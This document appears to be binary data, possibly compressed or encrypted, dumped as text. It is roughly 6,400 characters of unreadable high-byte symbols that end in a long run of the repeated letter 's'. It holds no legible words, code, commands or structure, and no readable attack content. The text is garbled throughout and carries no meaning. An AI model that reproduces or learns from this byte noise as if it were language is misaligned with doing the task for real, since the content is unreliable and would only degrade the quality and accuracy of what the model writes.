+òÏi-&Ò‡£óÍ BŒ’Ú$çÆÑÛãDˆcÙ™ÑÏ“”/’š¥iÆÜO;û‰ú€>Ã™J*„‰ù³«¨7 pf–‘IOgò­Sña—Óé:–—âJ¼Yb“òÿæ	h¶•¾7İc8ÁÊà9 {6îŸzQî7ş|ñÙÍÚ“ëãj|½NR2º¤Á+Öœ¨|m¥¯™W`3	ÌÏ*zm†Iì…ÔÜÓ·Ë;¹—çÓ@zÓD¡òZãˆÚEªÊˆÕœàz9ÜlXî¾‘‘·ôN€¦ùÒo{¢˜^D6‚Ö1ØdjŞË	³ÆoLŞM$çÿÓ\TÉüq@:×`-MŠ¤ú¦aŸL4˜3ç¨¨+Ñû­¼Ië${äDªıTl˜	°N”'ÓTûh¨-Ùˆ
+íªõÄ±ÕÖj^áÜ4¼‘ş·hÎáÜÒg{ÎM:jNò@ç²¦ä³x×$I½®•*ıĞ¢Ô³…’ ””™h°í*¤1b}Ge‘·òhW¯Ş¤{×ë‚(ÒtÇ/è"
+:³’îó]©ğ_­š€OòÚ#ã%ëŠÈ>:Ó$Uç¤}ï<Ÿ@f––À:Z6š½[Í´ÓÎr{yÓúç§ª(çWĞö˜ä%¬.`‘dÑºÜ™¯
+d¢ù c‚îµäÌz¼K¤@gd¶)Æ2ÁEîÙ=mÒÚ2Ñ÷)´˜ÛıÜEØ½•T—‡
+%¢‹ŒS\t˜	ÂËâVTrîb‡}Ï.Á»vªä¨O°-!F9—ØGÄØ²ÿN0p­gH?á
+ÜÉø009ùşåz¿f¤©—òL+cñs + Â~\Ú•7SÀ4‰f®éğ‹ÅZåt\*	M‰+uötH{U5t‹ÜK¸IüíË ÜíWR®(=`”ê·ƒ4bš^»ÿËYyDkI£Ï2Û«‚“•1«Ã_ZÍm8ñ=Ó"C#«…QK_P©›—`ˆróêWÁÜP©Œ©CMØÌĞ–[g ÃÑş,ñN•Gõ±É…àUM›Öœİu–ÃÀVÍkqü$¾€£wa3Àªf%6°Àá*àü6šÆµr±nˆ1”şç¦am\ÑËÚ‡@]á´@±[\º@ ›2Ó¥{¶«Tµçû–ø¤¼Õ €¤§¨oËhùÕ`ÒAXá£w*Àø–¯èÎdwQ€sÀÕÍ²ÇI¦<ÔÒ†Ššo\nw
+>tì9VV,l¡ÉTQ¨¨ƒOúå¿ºïn¹·İÏCØeidy¸_Şñºy/·xœgUØGÛ¶'“&¡2Îê.¢ğÖƒS´c	Şºe07»cpÆk
+–Vi €Ò O8ôUÜf›ÏÒ=FÿyÔ%Em‚ƒTAHx¸TîÊ1ñeÀtVv'#*°Ò†?Ü¼¹ãÕmç+Î9r»>¾p?}½²$½î CÚìØ-Æ2½Ñ,'‡âheç$¥Hñ€ıè%÷‰›íøD]„ÅÌö¡ÈA÷gÍ5áºz:A†YWµÊ(´áÙè½ğ‰‰äYÎ¯éûôqIb#¹pëç©Ô–èªJ\!ÑèßO¸¼ôlÜüĞ3æ"Ñ&É4ˆ±˜ím@f „×›ñÇîkwzl+ÆFC®nÖ£†'
+YbzÏË—µVÚ"A©]—#:¸9‰Û*ÃÖ <åìÙÖH¿ä’u)~=¸P¾ÕYÊÂÈ?lV€[Ä™®>hÂ³î¤ÆdÔØ÷ÃŞB%ĞM\U’òË_€GĞW{'×öÅr1wßÔY˜O+|íte·
+OÉEªi4—R:Ù|+}Ôqæ5h®¯Ë:¸[äáN†uÊzØ’¼ ÖF
+¡àÜïÓ„uAÔÜ´5i_„éºãè8©ÄÓ±DUÏÛw0O kêëÜÌä¢ùşãB?_wk×È¸¶í”Âñ´ÅOÓ9e£XMĞÑ$j(Ò:fçc~VM¢Í3&ÁÌÑZŸTú#'øÎ–{ö¯rz»‚õ¤dÑv{'B:ÔÁëX›Èªîæ¹âqÿˆ`%ê°æv³%f²?¸5Üs2 :°Ì£¨$Ø×xùÇ‚/óÊ[õ?‹Óù9‘,ı2÷ÁµÓ8ƒAPìg…Êgq‡‹~Â>A±xzÅq¶ìó£äÓiôµLPº€&[ŞeX³jô°j~jÍ¸eÙM¦ğ Œæ·Óİ•+0&4eµ¤qÖæ7=N7ÜÁ¼š‚'rWœı»=qjgb§oØÍIP?§«6Ì›¨êo}:>là¸gˆº`Å‚ìÆvıÅéX )´9tU
+ı©$®íÚQÕKßqÍôAH˜Y½İIhB,Šg}$åo]Ö&hkÄ 4Şô÷Û/\LÓGŸ_IÕ­ÖrûFÂ÷³†ĞÉö„¯ÅM¤¯wG¦‹6¬Œ§yÔè²æIŒE1­ˆåç4]«tºWâÇSsä8º{xJªÎê£˜aCÚ§
+ÂßDSn~·gEA”ù¶Ht¨¥Ãåø]XfQãë)Gû¿ _fhêZ3"øŞkÏ÷çÁ:½’{ÇäO"l¦g)ÈÆR–~7`Áôxñ ÇßÅá¡ áƒÍí47G±‹şÊ¿LÇd Ïù} ¹,ğ³{E[³ñÅ¡¾ÊFc%R´|WÈäµJàÁ‰RÊêêŠúJi2_æ–ŸcD¯‹;•NïV2°	u ”ø=Ô×y²>‚!~‹÷Uï0–,ı®Ù4. èH¦‡‰Nê™N+<NöÛa­_7àî[ıø#
+?Öµxç¨º]ş€€T*2™W†_Š©eŒõß¯Q¦b*äPãí@-•1a–ªêZ¤M…±ªN»0‚ä£ö&,dÑckãG³6Ú#Åò^¥×ÿûä{hß¢C+jgÓOã'"T²GK©CÇ÷OQbØêÅÇ1kVç&µIÖ§Uû-+È¦™÷-,Y™¶L[pÆ0¯M`¬•u+o‘‡İ+§ !z³IUCx–t˜¿{ØrÒq*§‚­¡ÊvK'[Âlæ€7~tóL¬¤›"²Ô/·i:ˆß¥ıƒõı3Tfg:}C4¨hù3%Éé­r°³ZÂ0l6°	€$w´½­B2§Áh¤ŸxÒ~Xfœ%Ø#²fó$‰ešïÇeLPW¹[L"ác9¿ñ@YœCïîöÑêc`¥OõFPÁÁıT»‘}Ó’'P´)O/>Y†ÇI¢4Ó<¢§‘KÎX¾„Iù€#ÓÓOw‡ÅGrU PÖQ«•&^˜ù^‰m?™ôŞU’şÔfrZJ0;Võ2ÊìqàÿCÚÓß|ëÀriÀ,ğ|í¯±í‡øû	b,÷.™(¿@bMJ˜–K'.ë½*}ÁJÙ%q&‹ Uş*'AÊÇ>âIÍãßÒÜ-˜¤¼‹jÑì‰º„f,˜ğ\zóˆ¸k^Ûò¢åpNÕ×qdÕ†XèXg¯¬=2‹[‹;â-ºzIş›T/¢±CëdûØvfµV©à{lƒ–¦2¸ÍÑ;»mğÆ¶¶ŞàIa9¤åØæ;ÂÌØf©ûæF6L287TTü¹¯Bá&iŒ_±iQª¨îxÒÉë½R}&·Úä;8ÁRW¬¯D4\Vô¼á—ª¾£±à>‡&‘bÒê˜U«(gb=§vÀKÒèõ’T"ÙdgEîÄRØ òÀ¦J#©V-§±BzøŸ³9[¶Iÿj³+ZG¯±„ÅŸpsôõP\‚QŞmv)ª/µE¯_N¼D­†[bÙ'°éÈ[c;6kÚ}Ÿj,ßoÖc€×h3™ÈßÚ~rjhˆEK«Lä--â£¼‡öÏ“2ÑŒ)ÿf‚óÄšx­z¿‡–¥•ŞL'ÉšL*M&Úâ´q©ä4ËK	²:x&ç‡Ï‡"1‚<’éY­Z´DY’#á¯±!j<­Ç­ÍE]¹4Yş4(æ_ÇÖF +#œÓıı®ğñ¯~àg
+œºÿ°Ö¼ÖÌÛ³!V‰4*OĞm-+DCğšVêk`†—ö­Ø}U´…"®óãc¦°&°àò¢´óLR	1+GË©©µvşù$Xwµ»”ÓÑÕîİäoñh]7=Ëpy»lÁš 3wN‘ë¬hó/æ
+ÎŒ¸–¥Á¬%×~ùHá‹	_¥¯^€9r\î2\‰v
+ú’{ eTÙ9OÕÏ"!AWc£#¾,#¼k÷¸åÉP„e×oİ¯.0ñÓ¸7˜"íìT¹k=¬ZRs†à6X¢¸{ô.?ª…"ø RÆÖşál¾eT‚ºV¯äÛÛ†¾{½IíÆê–AdĞ·}Påíİ1¶P¹•^$K)bR‰KÆ¶¬Ä÷O$®[Ç%™Ø’¡+®W4R%£è {eËEl!«ØeËî´àñØ	÷¿¶-ĞùWeS#¨»y¬Ñ„.úŞmÀ‡ÍX4øñs¼Ögáù0ËOf -8PöìªlJº¶Rx`$~--îÄÃŒr ä²Ù¤d* ë&@)`(òt[eªÆv‡èj†N¦³ã¸s¤ÒîÅ€ú£Uxu4Ï<aßÔ$jRØ={ö«Á‘F™³Óôæ;ğƒ¯–M
+kÀ ;ˆGÜãÑ:•|Y6îÀäœ+ÍJùdDYëà<ZSNÆ‡L
+mîe½ÊN*ÚûR+0ñ`ğŸ¢CÇé[İÁND³€÷¡¯RŠr“4òùÄQ:³Øn7Œ.úX5T_8ª9†Eëø’dèôU„Xó	­XüU~Sƒveô‰R¦Y@şÏ’DçÙB)ü2Ï‹ûFA4è+Œå)Ã/üß* 1]od
+^=ı­¥ñ¶%yó®¦á-¤?…¤û¡HF­-Ş¼ÌI‡[°¹÷H¿4ÍŠ	XAúÓ¯dù¶´M5çkN'`4YÔö<lm¦)æŒ¯‹Á>›¼„ÛjsŞï`@Î~Hü²‡½ÍMŒÙYèroÍPÇ­cŸfn@„¦|=å§amuBèt²Mv.Ä¤ƒ8”6$!{ª‡Mqù{:ÈÜ[ö`RÑl/øU©J]‰È¯ã’Ó3ëuğÕ0xqI—•œ·(“/vÅAg wWÌå‚NıY´M¾†¦¢C¬2[ Mj¨\hÎŒ“¯òAõŠßúK’–<™Ú¢D×œf“üºÉ¥¨C%6nó`ˆ¸ü”[¨lPÏDÕ_¡·«a\»€ê¾|ÍŒÜßÏ;P+¾=|qK†2áçRîØË[k{¼¡TàA€‘†º&?­mPÄ–) }Ó‰¹ÿVüÑ¼'’”^»‡ià¦	§Şá=<Ñs¨àõ$í6N:YŠûÍÒ?lG±zÙ¬¬¾_æ¨°ç÷‹
+âïE³ÃŞğN4RŸunq-€C²¾°HÒ%m¯Õx#ùæ‚Ú…³S`süä3îW¦™GÈCOQÎó‹Ï‡=î–G»ó-.cÄeKXoÈ’©L3¢Îæ¼‹‘x<Û‚‚÷ëÈb{¿Jk¦B½1œe]Nø¬òmèÿâ_ÖÿØÚ,4ãñ3å× q+0é¢)ãéª4#-[0·Jº*]Y¬ı½˜èïQÂTS”Ô5¤TÜc~U˜!Ræ¼L5§%ñ6éÑı‚&Ñœ_OÚ]•ÏHàpC8Ó¥7¹v†x€f¨Øw©&–TGå¡îDá–†GÈÉC©·'Ü¡”€‡¸í};ó HñäWÎğİ„]7Õ¬h³‹×ËŒYc&µŠ:M&I"¯à”¸2ä:–eõ/Ï‰è§*Ì'ù|¿£Ëáä‹‚3¯iO½ò~ÎlíÿŸÛ)‹¾®Pdåv öÌ¦9Êú5RK%!Å£Òù~rVæÅ!Ã÷b§ÜÄêèÍ/¤DRqªN7¥`·=w-¶sèd;£H  QV¥“FßÃBÔks·}á[®‰H™MÃ^¡2×ŒTtày˜Ü/«í}äBè[­½Ç‰ ½G­…}4†ñó›R ƒÉ ë“>İÃAı•ŞB½}Fz¢@ŒsÑZ1”¼õè|¬êl¾ü
+	â^EáJ«ë\U‘"Õr‡6¹ëÄ’+¤ã£Z iš;wÉ—@l¸_3j{1RæH>7™h½-ëáöË•ê„Wgá²õÎc Š»®™ÛÔOrÊş`Nx[ò·ÌÌ§4RÈÆæÍÃ¬ÿEüÁ5êN„6&DB+À›S¥]€ ‹5‰ÛÏÂs-9_ûèÉc½âÁ»±ZE…Ô?ÉP*yáUI cùÁ­ëËÕ'ygø|§3ƒî•‹kv­Á\ƒ8ûNk¡qP)MÃ$Í/Óuë©eUª ÀNtœssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssss
